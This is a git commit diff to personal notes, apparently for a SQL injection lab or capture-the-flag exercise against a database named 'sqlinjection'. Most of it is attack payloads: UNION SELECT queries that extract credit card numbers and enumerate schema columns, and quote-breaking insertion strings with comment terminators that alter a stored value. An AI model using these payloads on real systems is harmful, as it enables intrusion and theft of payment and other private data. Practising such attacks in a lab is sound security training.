d27d6b699ead5e4600777caf9aa6dc89d4c0e501
matthewjrobinson24 <matthew91796@yahoo.com>
2024-11-25 14:56:04 -0500

    Update SQL.m

--- SQL.m
+++ SQL.m
@@ -7,16 +7,16 @@ UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments
 UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
 
 
-'
-'
-'
-'
-'
-('''', '''', ''', '''', '''', 3)
 
 
-want -----> ('Hack', 'er', 'Hacker', '1', '1', 1)
-current --> ('Hack', 'er', 'Hacker', '1', '1', 3)
+i0Qnt0tEoeKSw8ZbYuPu
+('', '', 'Hacker', '1', '1', 1)#', '1', '1', 3)
+('''', '''', ' Hacker', '1', '1', 1)#', '''', '''', 3)
+('','', Hacker', '1', '1', 1)#
+
+
+want -----> ('', '', 'Hacker', '1', '1', 1)
+current --> ('', '', 'Hacker', '1', '1', 3)
 
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
 ----------------------------------------------------
